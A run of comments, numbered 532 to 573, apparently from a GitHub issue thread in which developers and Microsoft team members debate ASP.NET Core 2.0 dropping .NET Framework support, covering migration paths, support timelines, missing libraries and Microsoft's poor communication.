532	"Up until this point the expectation was created that ASP.NET Core *would* be able to keep running on desktop framework, and thus speak to the breadth of etc etc. I don't know what kind of tea leaves we were supposed to read to know that that was unrealistic :/

Like, to be clear: the idea that ASP.NET Core might only run on .NET Core is not crazy itself, but we never heard a peep of it before. All public information was that it ran fine on .NET Framework and there was no indication that this might have to change."
533	"> .NET is big and old, there's no way you can expect the ASP.NET team to speak to the breath of libraries that exist in the .NET ecosystem. It's unrealistic

Isn't that a good reason to keep supporting .NET 4.x? The burden of compatibility/interoperability can be contained to .NET 4.x platform which can be a working solution that could relieve .NET Core from needing to interoperate with older libs and relieve pressure to port existing popular .NET libraries to .NET Core (for MS and external authors)."
534	"@mythz 

> Isn't that a good reason to keep supporting .NET 4.x? The burden of compatibility/interoperability can be contained to .NET 4.x platform which can be a working solution that could relieve .NET Core from needing to interoperate with older libs and relieve pressure to port existing popular .NET libraries to .NET Core (for MS and external authors).

That's why  ASP.NET Core on 1.1 's lifetime has been extended (though not permanently). We're going to make sure that SignalR works because that was stated as one major reason for using ASP.NET Core 2.0. At the same time, it's not where ASP.NET Core wants to be in the long run. The intent was always to ship as part of a unified .NET Core platform. 

@gulbanana 

> Up until this point the expectation was created that ASP.NET Core would be able to keep running on desktop framework, and thus speak to the breadth of etc etc. I don't know what kind of tea leaves we were supposed to read to know that that was unrealistic :/

ASP.NET Core on .NET Framework was unfortunately never communicated as a stop gap solution to ease porting (that's something we messaged very poorly). It was never intended to as a supported platform forever which is the logical conclusion if you were to assume that some dependencies will just never be ported. 

"
535	"> That's why ASP.NET Core on 1.1 's lifetime has been extended (though not permanently).

The issue is whether or not that's enough, the current version has basically been EOL'ed before a compatible/stable release has even been delivered.

I don't believe the value of existing investments is being considered, who is going to want to go through all the effort to migrate to an EOL platform? Devs will be working on their existing brownfield systems indefinitely, they're basically being told their current ASP.NET v4.x skills are going to become obsolete and they're not able to migrate to the new ASP.NET Core development model because .NET 4.x support is being dropped and it would be irresponsible for them to consider or recommend migrating to a dead-end platform."
536	"@davidfowl

> ASP.NET Core on .NET Framework was unfortunately never communicated as a stop gap solution to ease porting (that's something we messaged very poorly). It was never intended to as a supported platform forever which is the logical conclusion if you were to assume that some dependencies will just never be ported.

Mistakes happen, that's fine. The problem now is that many people made this assumption and so are *only* using ASP.NET Core because of their logical but erroneous conclusion. We'll see just how many, I guess :/"
537	I waiting asp.net core 2/ .net core 2 so long, but the result is so depressed.
538	"@mythz 

> I don't believe the value of existing investments is being considered, who is going to want to go through all the effort to migrate to an EOL platform? 

Can't the same argument be made about ASP.NET Core 2.0 being EOL on .NET Framework next year when 3.0 comes out? If you're saying a year isn't enough on ASP.NET Core 1.1 why would you suggest a year is ok on ASP.NET Core 2.0?

> Devs will be working on their existing brownfield systems indefinitely, they're basically being told their current ASP.NET v4.x skills are going to become obsolete and they're not able to migrate to the new ASP.NET Core development model because .NET 4.x support is being dropped and it would be irresponsible for them to consider or recommend migrating to a dead-end platform.

Who got told that ASP.NET 4.x skills are going to become obsolete? If anything we're hoping they aren't. MVC in particular touts concept compatibility with a few new features. ASP.NET Core looks a lot like Katana (and that's not by mistake). If you're talking about Web Forms then what about MVC ?

I don't have any experience consulting but I would agree that if the dependencies aren't available then I would agree. Either that or the application needs to be re-designed to take this into account.
"
539	@xyting can you clarify?
540	"@davidfowl 

> Can't the same argument be made about ASP.NET Core 2.0 being EOL on .NET Framework next year when 3.0 comes out? If you're saying a year isn't enough on ASP.NET Core 1.1 why would you suggest a year is ok on ASP.NET Core 2.0?

I was under the long-time assumption that ASP.NET Core 1.1 was just a stop-gap solution to ASP.NET Core 2.0 and .NET Standard 2.0 which would be the compatibility focused and stable LTS release that will bridge the gap with most of the core functionality missing from .NET 4.x - up until this thread basically destroyed that assumption. Keeping .NET 4.x compatibility up to ASP.NET Core 2.0 isn't ideal, but it's a lot better than terminating it at the current release which no-one expected.

> Who got told that ASP.NET 4.x skills are going to become obsolete? If anything we're hoping they aren't. 

MS does with all their aggressive marketing on .NET Core with all new announcements and features seemingly being ASP.NET Core focused. Is old ASP.NET WebForms/MVC even being developed in the open? What proportion of dev effort is being invested on old ASP.NET WebForms/MVC vs .NET Core? I've no idea, everything I've seen recently, all weekly standups, video tutorials seems solely focused on ASP.NET Core. I know I definitely wouldn't feel comfortable starting new greenfield projects using old ASP.NET WebForms or MVC technology.

If you're hoping they aren't MS should definitely communicate that better with clear roadmaps. Given how volatile ASP.NET has been in the last few years (this issue being a perfect example), it's impossible to know what the future is without an official commitment and announcement."
541	"Does anyone else feel that it would have been better if version 1 never ran on full framework? I didn't expect it to because of the naming. Now that it does and I've had a taste I'm disappointed to lose it. 

I do get where you're coming from on this, you want to iterate the whole stack as fast as possible. You're competing with a whole bunch of green fields web frameworks that control the whole stack and have no baggage to drag along. Hell dropping the baggage of System.Web is one of the main reasons ASP.NET Core is so exciting.

Having slept on it I can say our usage will be fine, the dependencies we need **should** all work on 2.0."
542	"> At the same time, it's not where ASP.NET Core wants to be in the long run. The intent was always to ship as part of a unified .NET Core platform.

While it doesn't take a psychic to figure out that .NET Core is the platform of .NET's future... if the intent from the beginning (or as you put it ""always"") was to couple ASP.NET Core with .NET core, that was definitely not communicated in any medium I've ever seen.

I've literally seen every single minute of every single ASP.NET standup (including Hanselman and Glenn troubleshooting Docker for 3 hours... because I have no life), I read the blogs, I'm always on Twitter, I go to 2+ conferences a year, attend user groups, etc. and **I've never once heard that communicated as the intent of ASP.NET Core.**  Instead, I've heard over and over and over ""it runs on both platforms"" and, rightfully, people feel like someone pulled the chair out from under them.  I've even given talks about ASP.NET Core and said ""it runs on both platforms"" myself, and now I feel guilty for anyone I've led down this path.  I would say the people ITT are likely to be on the bleeding edge and would be the most accepting of this kind of news, and there's a lot of backlash here.  This seems like it's only going to get worse as this news trickles down to the developers and their managers who aren't as plugged in, and are likely more conservative than those ITT.

Besides the lack of communication and the lack of support for some scenarios, I think a lot of the backlash is just due to the timing of this announcement.  .NET Core 2 isn't even RTM'd yet and it's already been deemed the only long term path forward, and there's essentially been a ticking time bomb put on Full Framework for ASP.NET Core.  I think a lot of our fears could be cleared up once we have something tangible to play with besides nightlies.

I really do think there needs to be a better tooling experience than ""run it and see if it works"" when referencing net461+ libs from .NET Core 2+ in VS, because I can already see that message of ""we can likely run most of your 461+ assemblies too!"" will be marketed to death.  Something that could analyze missing API's of what we referenced, providing compile-time errors, ideally even suggesting compat nupkgs if they exist (like System.Configuration in the EF6 example above... and have it work :smile:).  Obviously, not everything can be analyzed at compile time (the distributed transaction scenario mentioned above comes to mind as something tough to anlayze ahead of time), but the more that can the better.  Something kind of like what [Immo did here for `PlatformNotSupportedException` and the missing net461 APIs for netstandard2](https://github.com/terrajobst/platform-compat) would be nice.

Just my 2 cents.  I hope I'm just overreacting.  Ultimately, a lot of us are just disappointed, because we love ASP.NET Core, and we don't want anything standing in our way of using it. ❤️ "
543	"Joining my voice to the concerns already listed, we are starting  a new ASP.NET MVC project next month and it  will be plain .NET Framework with  ASP.NET MVC, because the customer doesn't trust Microsoft doing the right thing in regards to long term planning.

The customer organization is still using Windows 7 deployments and this project is an exception, because the majority of their web projects is actually done on UNIX with Java, with .NET being mostly used on desktop applications.

This type of uncertainty just piles up to the broken history that Windows 8 .NET stack and UWP were, increasing the interest of the organization CTO to look for more stable alternatives to .NET future.

If you are forcing these type of organizations to write modules from scratch to work on ASP.NET Core, I can as well advise our customers to adopt something with more stable roadmaps,instead of losing face about issues I cannot control."
544	"@davidfowl It might be that this change will work fine for 99% of the projects. But it was sold as ""it runs on both platforms"" and ""you can use it with full framework if you have to"". Everyone knew that the full framework version of asp.net core was for the projects that could't migrate, and that was fine. And people planned with that in mind.

This change might not be the worst in terms of code, but it will most likely create a huge shit storm when the more regular developers see the news. And it will not be about the code, it will about what was promised. And the promise was ""run net or core, and netstandard to combine them all""."
545	"@DamianEdwards @davidfowl Thanks for sharing the plan.

SignalR on 1.x is a big relief to replace our unsupported version and also the news that ServiceBase is next on the list next as we are currently using that also!

We are heavily reliant on EF6 and spatial though so we'll be stuck on 1.x until that has the feature set we need....

On a semi-amusing side note however, this may finally force a more microservice deployment for this. I wont be looking forward to explaining why our LOB customers need to have several more api's installed on IIS to just to get our products working though....

I really wish this could be held back as just seems to be too soon and as several people have mentioned this will generate a significant backlash when the blog post drops.

Also i must say i feel a bit sold-down-the-river when from the start the sentiment has been this will run on the full framework and have been preaching the same thing to colleagues. Explains the confusing naming choice of asp.net core though.
"
546	@shanselman @davidfowl My biggest pain point is NHibernate. Even after the EF Core release, it's still the only most advanced full featured O/R mapper.
547	"@shanselman @DamianEdwards I am in the process starting to think about upgrading a site from ASP.NET MVC 4 to  whatever the latest version is (I'm confused whether it's 5 or one).  I still need to run the full .net framework because I am referencing both SyncFusion and Telerik libraries. SyncFusion to display PDF files and Telerik to generate word .docx files.  As others have pointed out it's simply not reasonable for Microsoft's  strategy for dealing with this to be ""try it and see if it works"".  I can't guarantee that and production everything is going to work because it is such a large code base of third-party code. 

While SyncFusion support is generally very good Telerik's support is not and I'd be surprised if they can make it work with .net core.  I have no idea what Apis they might be using that are not supported in .net core - and as an end user that's the whole point of the third-party product, I just plug it in and it does what it needs to do.

Frankly for a customer who doesn't deal in the stuff very frequently (I mostly do WPF) this is all extraordinarily confusing. There are too many different versions, with various incompatibilities. As someone has pointed out it's a bit like UWP XAML - simliar but completely incompatible with WPF XAML. 

Not good for developers and just another thing that causes developers to lose trust in Microsoft (one of many over the last few years). It would seem to me that ASP.NET should definitely run on the full .net framework, because there is such a big library of tools that people may need to use on their server. In my case I can easily update to a later version of the .net framework if I need to in order to use latest ASP.net stuff if an update was required for the new ASP.net functionality.

Whatever messaging goes to developers needs to be much clearer, before people just jump ship completely.

...Stefan"
548	"> ASP.NET Core on .NET Framework was unfortunately never communicated as a stop gap solution to ease porting (that's something we messaged very poorly). It was never intended to as a supported platform forever which is the logical conclusion if you were to assume that some dependencies will just never be ported.

I personally don't have a problem with the changes listed in this issue, I understand the reasoning and they make sense, now that I've read through a lot of responses here. However, what you've just said highlights what's ultimately the crux of the issue - poor communication from Microsoft as a whole (Which I appreciate is not your, or any _specific_ individual's fault).

Maybe I'm missing something, but there's more to ""developing in the open"" than just having the code on github for everyone to poke through and play with. This very issue was created because a change appeared in the code one day that took people by surprise, but obviously yourself and everyone on the .net team knew about it and understood it - so it was a long time coming. The problem is that the rest of us mere mortals were completely blind-sided by it.

Worse still, I suspect the majority of developers don't pay too much attention to github to get their knowledge and information - so this change is going to surprise a lot more people than are already commenting here. I only discovered this issue myself because it appeared on my RSS feed of hackernews - which is not what I'd call my top source for news and information.

Anyone following along from the blog posts on MSDN will know that 2.0 is coming and they'll see it as the holy grail of bridging the gap between asp.net core and everything it was ""missing"" previously, but they're completely unaware of what is essentially a breaking change for certain workflows. There's been very little details on what's really happening with the design of asp.net core 2.0. I suspect more details will come later this week at Build? One can only hope.

The .net slack is another resource for information, but it's a little bit noisy to be kept up to date with what's really going on. It's great for developer involvement and asking questions, but it's hardly a news source.

Twitter and social media is another source of information, but again a bit like this github issue by the time it appears there, it's usually because someone has raised concerns with a decision that's already been made and caught people by surprise.

This isn't the first time we've had this exact problem, either. Remember the fiasco caused by changing back to csproj? I don't want to get into the debates over that change, but it's another example of a change that happened to people's surprise, that was so poorly communicated that to this day, many people simply don't realise that it's not the same csproj from the ""bad old days"".

I'm not completely sure what I'm trying to suggest here, but there is definitely something ""missing"" from the open development of .net. Microsoft does a great job of providing resources and documentation for developers, but only for finished products and things that have shipped. The roadmap, the planning meetings, everything that gets to decide the design and direction of the frameworks seems to be done behind closed doors, with the occasional mention of ""select partners"" and the like. I'm not saying that every meeting should be streamed and broadcast worldwide, but there could definitely be a better middle-ground whereby decisions that are made and the rationales behind them are communicated as early as possible to the community, in a way that's easy for those of us who really _want_ to follow along to digest and keep on top of. Perhaps a dedicated blog on MSDN (or elsewhere) that's updated regularly when those decisions are made."
549	"One of my biggest issues with this is that on almost every conference the last year that ASP.NET Core has been presented, you have presented it with a slide that shows asp.net core running on both .net framework and .net core, just have a look at this: [Explore web development with Microsoft ASP.NET Core 1.0](https://channel9.msdn.com/Events/Ignite/2016/BRK2191) from Ignite last year. At about 7.50, you will see the slide.

The biggest showstoppers for me are System.DirectoryServices, ServiceBase, EF6 (EF Core is not ready), ClosedXML (for creating excel sheets)."
550	"> Support for ASP.NET Core 1.x on .NET Framework will be extended for at least another year (until July 2019). We will reassess this annually and commit to providing 12 months notice before ending support of ASP.NET Core 1.x (so by July 2018 we’d announce whether we’re extending for another 12 months to July 2020) (Side note: is anybody else freaked out by the fact we're talking about 2020 already? No? Ok, just me.)

@DamianEdwards Thank you for the announcement.

At the moment our company is developing enterprise applications for several clients using ASP.NET Core 1.1 on .NET Framework 4.6.2. Hearing that the support for that framework combo is supported until at least 2019, and possibly extended 2020 is a **huge** relief.

> We will port System.DirectoryServices and System.Drawing to .NET Core this year (fully supported, cross-platform, preview for at least Windows in Summer)

These are the **two only reasons** we're targeting .NET Framework right now. If these are fully ported to the .NET Core 2, I'm sure that we can port our applications to ASP.NET Core 2 safely next year."
551	"Seems like alot of ppl have broken the cardinal rule of being a MS developer - dont commit to any product/fork until atleast the V2. 

but yeh, talk about alienating your enterprise clients! the whole reason they use MS is for backwards compatibility. 

The majority of ppl who run ASP.NET do NOT CARE if it runs on linux. And if they saw a blog post, with a speed comparision with ASPNET Core, they wouldnt even both reading past cross-platform if they saw it didnt support legacy .NET.

lolcats. "
552	"I think there is value in having ASP.NET Core 2.0 fully run on net46x for the sake of giving lots of folks a smooth migration path to the new world. I think many people were waiting for ASP.NET Core 2.0 and .NET Core 2.0 with the hope that it will close many of today's gaps and allow a migration. If ASP.NET Core 2.0 will require everything to be ported to netcoreapp2.0, then it will be a massive slowdown for teams and perhaps even jeopardise feasibility.

However, that doesn't mean that there cannot be an ASP.NET Core 3.0 shortly after which will only target netcoreapp2.0 for all the people who work on all the new shiny greenfield stuff and want to be on the fast track.

Having two versions of ASP.NET Core (2.0 and 3.0) side by side could really be a good thing (for at least a while). That could allow MSFT to quicker phase out the current MVC 5 stack, because the new version of MVC would essentailly be ASP.NET Core MVC 2.0, which would run on full .NET as well."
553	"> I think there is value in having ASP.NET Core 2.0 fully run on net46x for the sake of giving lots of folks a smooth migration path to the new world

What would make it smoother than porting from ASP.NET Core 1.x?

> I think many people were waiting for ASP.NET Core 2.0 and .NET Core 2.0 with the hope that it will close many of today's gaps and allow a migration. 

The bulk of the work done to make things compatible was done in .NET Core 2.0 and .NET Standard 2.0. ASP.NET Core 2.0 honestly doesn't have that many new features. We're said we're going to backport SignalR to ASP.NET Core 1.x (which is post 2.0 anyways). Is it just a perception thing? 

> Having two versions of ASP.NET Core (2.0 and 3.0) side by side could really be a good thing. 

This is what we're doing with 1.1 and 2.0 (just flip the numbers).

> That could allow MSFT to quicker phase out the current MVC 5 stack, because the new version of MVC would essentailly be ASP.NET Core MVC 2.0, which would run on full .NET as well.

MVC 5 will never go away, we don't deprecate anything. It'll be supported as long as .NET Framework exists. You still can't run ASP.NET Core projects inside of the IIS integrated pipeline (on System.Web) and it doesn't do all of the same things as MVC 5 on System.Web so it's really not a replacement for certain scenarios."
554	"@davidfowl Will I be able to create an ASP.NET Core 1.x app, which targets full .NET and netcoreapp2.0 so that I can migrate a current legacy app to ASP.NET Core first with all dependencies being net46x and slowly migrate one dependency after another to target netstandard2.0 until everything is on netstandard2.0 which then would allow me to upgrade the ASP.NET Core 1.x app to 2.x (and drop the target for net46x as part of that)?

If yes, then I think I misunderstood the thread. I think this is really what most people are after here."
555	@dustinmoris yes you can do that. The main concern people are having is what happens if they don't get migrated to ASP.NET Core 2.x before support ends on ASP.NET Core 1.x, if it is possible for them to migrate at all.
556	"@alexwiese ah ok well that is great, then really what are we discussing here now? Rather than discussing what framework to target we should be discussing the support period of ASP.NET Core 1.x, which is something that MSFT could easily change if they wanted :)

EDIT:
@DamianEdwards wrote this a bit further up in the thread:
> Support for ASP.NET Core 1.x on .NET Framework will be extended for at least another year (until July 2019). We will reassess this annually and commit to providing 12 months notice before ending support of ASP.NET Core 1.x (so by July 2018 we’d announce whether we’re extending for another 12 months to July 2020) (Side note: is anybody else freaked out by the fact we're talking about 2020 already? No? Ok, just me.)

Sounds good to me. Commit to one more year of support and then periodically re-asses. Makes total sense to me."
557	"I've read every post in this thread. Still one question is unanswered: **why** is this decision made? I can only conclude it was needed due to a technical issue. If 'confusion' of the naming is the issue, Microsoft should hire a better PR person and stop stirring the shit like the team is doing in this thread. 

So what is the technical issue that blocked ASP.NET core 2.0 on netstandard2.0? Nothing is impossible in software land, so it can't be you couldn't come up with a solution that isn't doable on .NET full (and thus can't be included in netstandard20). Yes that takes time and effort, but I have the feeling you all didn't really realize the side effects of this decision for your users, what the amount of time / effort they have to invest because of this. 

This decision has another downside: ASP.NET Core isn't a consumer of netstandard and therefore isn't a driver of it. It makes the netstandard a follower and as ASP.NET core doesn't depend on it, a follower with little meaning: .net core 2.0+'s API is the surface to target, as ASP.NET core is targeting *that* surface, not netstandard2.0. 

And, sorry @davidfowl, I know you mean well, but suggesting ASP.NET core 1.x to people over and over shows you really have no clue what the situation is for the people you suggest that to: the people can't migrate to ASP.NET core 1.x because they don't know if there is a smooth path off of it without a firm deadline: it might be they need to stay on that platform for longer than they currently think (dependencies needed to be ported etc.). That alone makes the decision to move to ASP.NET core 1.x a decision based on nothing else than a 'promise' from Microsoft. It's an API meant for internet facing code. They need to know whether they can run an app built *today* also within 3 years time because Microsoft will fix security flaws in it (to give an example). 

Frankly, I don't get the urge to start yet another chaos cluster within the .NET ecosystem: we need stability, dependability, reliability: ""my code written today will run in 5 years time as-is"". yes, I know that sounds silly to some people, but that's reality: there are already more software packages on this planet than there are developers to maintain them and the gap is only widening. You can't simply assume that an organization will decide to  use ASP.NET Core as their webstack and hope code written using it will run within 5 years time, organizations don't do that anymore: they know there are stacks out there which *are* reliable and give them that: they know they might not be able to rewrite the entire app within that timeframe so they need that assurance. 

Microsoft has shown with this thread and, sorry, their **terrible** PR around this issue, they can't give that assurance. And no matter how much spin you try to give that in the coming days at \\build, we on the other side of the fence have learned that Microsoft Marketing != assurance things will work tomorrow."
558	@FransBouma I don't think it was that there was a technical issue, it sounds like the motivation to only target netcoreapp2.0 is because this is the only track that MSFT can move as quickly as they like, which is good for us after all, because it means that ASP.NET Core 2.x can move much faster than any other web stacks in the .NET world before. If you cannot commit to this fast train, then you can stay on ASP.NET Core 1.x for longer (currently supported till 2019)
559	@FransBouma as @davidfowl and @shanselman mentioned there are new APIs being added at a fast rate in .NET Core, and ASP.NET Core 2.x will use some of them, therefore the desire to target netcoreapp20. If they were to add these APIs to netstandard2x then .NET Framework and other platforms would have to play catch up, and they are notoriously slow moving. 
560	"I'm going to add my voice on the **This is a Good Thing** side of the debate. Here's why:

- The team are not just doing this for the hell of it. There's a whole slew of new features and optimizations ready (or nearly ready) to roll in .NET Core that are incredibly useful to people building modern web applications, APIs and microservices, and waiting for those features to land in the full Windows .NET Framework would delay release by many months.
- Many of the complaints I see in this thread are some variation of ""I can't do X in .NET Core 2.0"" when what the writer actually means is _""I have to change the way I do X in .NET Core 2.0""_. Yes, you have to change. No, that's not a bad thing. If you have a small piece of discrete functionality in your ASP.NET MVC application that does something with PDFs or DOCX files, and you _really_ can't find a better way to do whatever that is (have you tried?), then break that functionality out into a microservice running on full .NET on Windows Server and call it as an HTTP API from your .NET Core application. Decomposing applications and moving specific functionality into small, self-contained services isn't even a workaround, _it's a general-purpose best practice._
  - NB As far as I can tell, the OpenXML packages are now supporting .NET Standard, so working with Word/Excel/whatever shouldn't be impossible.
- .NET Core 2.0 isn't even in proper public preview yet, so complaining that it hasn't got support for LDAP or whatever seems premature. If RTM comes around in Q3 and there's still no way of interacting with AD or Kerberos or whatever then complain away (although also think about migrating to modern token-based authentication systems because it's not 2008 anymore).
- There _is_ a smooth migration from ASP.NET MVC 4.5 to ASP.NET Core 2.0. It's called ASP.NET Core 1.0 (and I agree that there should be some promise of long-term support for 1.0 under the circumstances). You can build apps using 1.0 and run them on Full .NET in an Integrated Pipeline under IIS 8.5 on Windows Server 2012 R2 until
  - Full .NET catches up and you can run ASP.NET Core 2.x on it, or
  - Whatever third-party tech you depend on supports .NET Core (or can be replaced by equivalent tech that supports .NET Core).
- Remember that&mdash;while your team might be hamstrung by external dependencies or internal company policies or politics or just plain inertia&mdash;there are hundreds of thousands, if not millions, of developers in the world who are looking to build applications, services and APIs using modern architectural patterns and new technology platforms (cloud/edge/IoT/etc), for whom ASP.NET Core 2.0 is a great fit. They want it to be fast, scalable and cross-platform; those things are important to a lot of people. Asking Microsoft to ignore that rapidly-expanding market, just because your 3rd-party control supplier or an open-source project haven't ported their code yet, is silly."
561	"@dustinmoris that suggests netstandard lacks the APIs to create a fast webstack. If so, we all have bigger problems.

@alexwiese like I said, I read the complete thread and thus also the posts you refer to. I know what they say and can see their point, but the decision made shows they have no idea what their users are doing with their stuff. I build a product myself, for many years now, and know that after a while you arrive at a point where you want to cut things out and move faster, without the old cruft that is outdated. But doing that has consequences, and one thing I've learned in the past 14 years is that backwards compatibility is one of the biggest features a software product can have: being able to use it and 'it just works' is a key point for many many people to decide for your platform. You might not think it's that important, and that's fine, but there are many many people out there who can't see it that way as their reality is different. 

It's not that the asp.net core team shouldn't move fast, it's that they do it in a way that breaks with many people's assumptions when they moved to asp.net core 1.x. "
562	@FransBouma Why do you think you have a better idea of what Microsoft's users are doing with Microsoft's stuff than Microsoft do?
563	"@markrendle 

> The team are not just doing this for the hell of it. There's a whole slew of new features and optimizations ready (or nearly ready) to roll in .NET Core that are incredibly useful to people building modern web applications, APIs and microservices, and waiting for those features to land in the full Windows .NET Framework would delay release by many months.

So, tell me, why not create these super duper APIs as .net standard 2.0 packages and post them on nuget? 

> Why do you think you have a better idea of what Microsoft's users are doing with Microsoft's stuff than Microsoft do?

Oh I don't know, by reading the posts in this thread? "
564	"@FransBouma
> that suggests netstandard lacks the APIs to create a fast webstack. If so, we all have bigger problems.

I don't think that netstandard lacks anything, because netstandard is nothing more than a list of features that need to be implemented by a platform that wants to support that standard. In theory we can move netstandard as fast as we like, just add more to the spec, but realistically it is not feasible for all platforms to catch up with those new specs.

So the question is, does ASP.NET Core 2.x want to commit to netstandard2.0 (the currently highest) and then know that it is stuck with everything that has been defined there, or does ASP.NET Core 2.x only commit to netcoreapp2.x, which can be much more than just netstandard2.0. After a while I am sure there will be a newer netstandard again (3.x?) which will catch up with new shiny things from netcoreapp, but that will take much more time and why should ALL asp.net frameworks be crippled to slow progression. It's kind of nice to have one really fast moving ASP.NET Core stack as long as there is also a second that gives people a more long term support which adheres with netstandard."
565	"@FransBouma Oh, sorry, I didn't realise your sample size was so big. 257 comments with a strong bias towards people who don't like the decision? Hard to argue with that.

DISCLAIMER: I am not an expert on Big Data."
566	"@davidfowl:
> Throughout this thread, you called out System.DirectoryServices as one of the core things. I assume you have some dependencies that you think will take a long time to get ported or ones that will never get ported. If 2.0 supported .NET Framework would those dependencies move in a year?

Yes, we have other things. System.Directory services is what I point out because even the top requested namespace isn't ready. All others are worse off. The API portability analyzer isn't even updated for VS 2017 where we can run it. The analyzer to *see if you can even port* hasn't been invested in and we're dropping support already.

> Which ones? 

Razor pages is a huge one, I've mentioned it several times.

> I don't know anything about stackoverflow.com but is it possible to break pieces off (I don't want to say ""micro services"") so that ASP.NET Core could be used for some parts?

No, this isn't really possible. We don't render in 18ms by making API calls and adding overhead between things. I'm happy to go over architecture anytime, you'd see that isn't really a reasonable route."
567	"I thought I explained this earlier but here it is again:

Any API that is part of netstandard that needs to evolve will evolve slowly. Things can be built on top of netstandard and can run anywhere, and that's fine. The moment you need a new API on say, http client, or SSL Stream, or Int, or String, or Array, or LINQ or any of the primitives that exists in NET Standard a new .NET Standard version must be created and implementations need to agree that they will implement it. Now that's not the end of the world because we own most of them now, mono, .NET Core, .NET Framework, UWP but there are others though like Unity (and probably others).  Each .NET vertical has their own time frame and ship cycle, they are each their own separate products and that can't be ignored.

But now you get the idea, a new netstandard version is created when new APIs come online. If libraries want to use these new APIs then you immediately lose the breath of support for all the platforms. You can cross compile and try to polyfill but that doesn't scale for all changes.

Hopefully that gives you an idea of what the process might look like bringing APIs to netstandard. @terrajobst would have a better idea of what the plan is."
568	"@DamianEdwards  and @shanselman  What about Service Fabric and Unit Tests? 

In our case we have a big micro service project with lots of SF applications which are Core projects but use .Net Framework 4.5 up to 4.6.(something). SF currently doesn't not support netcoreapp therefore we had to use .Net Framework but since we didn't want to fall behind we used the .Net Core project. 

(another issue is) Because our services are .Net Framework and MS Fakes are not available for netcoreapp all our unit tests are normal (or should I say legacy) .Net Framework projects. Almost all our libraries are on netstandard 1.0 to 1.6.

Again our client apps are using Xamarin Forms + UWP and we **managed** to use netstandard so our libs are compatible. 

Does this mean we are stuck and won't be able to upgrade to .Net Core 2.0 and netcoreapp2.0 and netstandard 2.0? "
569	"@NickCraver 

> Razor pages is a huge one, I've mentioned it several times.

I understand this one but I can't believe that you're going to convert all of stack overflow to razor pages only. If you're already using MVC today why not just port to regular views and when more dependencies come online, port to razor pages. The way razor pages is designed makes it trivial to go from a controller action to a razor page.

> Yes, we have other things. System.Directory services is what I point out because even the top requested namespace isn't ready. All others are worse off. The API portability analyzer isn't even updated for VS 2017 where we can run it. The analyzer to see if you can even port hasn't been invested in and we're dropping support already.

Just make sure to escalate that list of dependencies so we know what's important."
570	"@aboo

> Does this mean we are stuck and won't be able to upgrade to .Net Core 2.0 and netcoreapp2.0 and netstandard 2.0?

You meant ASP.NET Core 2.0 and? .NET Core 2.0 and .NET Standard 2.0 don't really apply here.

Yes, you'll have to stay on ASP.NET Core 1.x."
571	"> The bulk of the work done to make things compatible was done in .NET Core 2.0 and .NET Standard 2.0. ASP.NET Core 2.0 honestly doesn't have that many new features. We're said we're going to backport SignalR to ASP.NET Core 1.x (which is post 2.0 anyways). Is it just a perception thing?

@davidfowl I think you're massively underestimating the fear that strikes the heart of a windows developer when you're told you're going to have to migrate things. _Especially_ when the new stack hasn't hit feature parity with the old stack, and it's unknown if and when that will happen. This is basically announcing the EOL-ing of ASP.NET Core on the full .NET Framework. And, while that probably wasn't the long-term plan, it was announced as a feature, and people thought it might stick around for a while. Roadmaps are shifting as we speak. Meetings will be had.

We've got some disgustingly old stuff that we have to support because of nominally maintained database connectors and SDKs. Some of these vendors are far more likely to release a new, butchered API with 30% existing functionality, an HTML5 interface and a fresh train of bugs than they are to maintain their existing products. Or they might just acquihire a competitor, release the product and quickly EOL it. Some of these vendors are big enough to be recognizable. We've got a lot of nice code, but some of that code also lives in the windows slums despite our best efforts because it's not always under our control. Old tech doesn't just gracefully retire. It lurks under your bed, in our closet, and beneath your keyboard.

I'm more concerned about this move signalling the possible sidelining of .NET Standard than I am about the rest of it. .NET Standard initially seemed like something that would bring the different implementations closer and closer to feature parity while allowing consumers to migrate to the evolving, growing platform. Now it's sounding like nothing more than a milestone of .NET Core features. You won't be able to (or want to) target executables towards .NET Standard - only libraries. And it sounds like there will be significantly less planning involved in .NET Standard, and instead it'll just get rubber-stamped with whatever got used in ASP.NET because it's already too late to change. It'll already be in production, after all.

Other developers have to sprinkle the code with compiler directives, split code into platform-specific libraries and compile with multiple targets. The rude part of me wants the ASP.NET Core team to dogfood that so you'll be interested in better runtime and tooling support for multi-targeting and multi-platform scenarios. And if your team wants it, then we might get it. The practical part of me says that at a minimum, you should have periodic releases of ASP.NET Core that target the .NET Standard. You need to make actual _stable_ releases anyway. No one's just going to compile the master branch from git and deploy to production. Why not do smaller iterations of the .NET Standard and match them with a tagged ASP.NET release?

Also, is there going to be a new ASP.NET for the desktop? All the fanfare made it sound like ASP.NET Core was the only ASP.NET. Now it's sounding like you won't get anything new on ASP.NET unless you're on .NET Core. And that's going to change a lot of business strategies. There is a whole lot of confusion going on with roadmaps.

> MVC 5 will never go away, we don't deprecate anything. It'll be supported as long as .NET Framework exists. 

Yes, we're quite aware that the old stuff will stay there. It usually does, and we appreciate that. But whether new things will get on the ""full"" framework matters a whole lot. We need to know where things are going. We don't want to ride the train to the end and only then think about how to move forward. We've also got our passengers to worry about. And the disparity between .NET Core and .NET Framework leaves a lot of people uncertain about the future. I asked a question a year and a half ago about when a particular portion of functionality was going to be supported in .NET Core. I even asked if it would be accepted if I were to work on it personally. Communication has been sparse. I still have no idea what's going to happen to it. That type of uncertainty about supported scenarios and timelines makes a huge difference in the code that we write. Even knowing what sections of the desktop framework are low-priority could give people ample time to migrate instead of waiting for status updates.

In short, I support what you're doing and the goals behind it. And I know it's hard when we get on here and complain about decisions that you've made for a very good reason. But a lot of people aren't going to jump on the pioneer train because they can't, and others won't because they don't know where it's going."
572	@davidfowl  I guess. What do you call a core project (new) with .Net Framework? Whatever that is, my understanding from the post is that the netstandard vNext will not support that. 
573	"@markrendle We are real customers. We're telling people things won't work. I know my architecture better than you do, so the arrogant comments aren't helping. To your points:

> The team are not just doing this for the hell of it. There's a whole slew of new features and optimizations ready (or nearly ready) to roll in .NET Core that are incredibly useful to people building modern web applications, APIs and microservices, and waiting for those features to land in the full Windows .NET Framework would delay release by many months.

No one is against them *also* supporting these things. Our complaints are universally about dropping support, not conditionally adding new features.

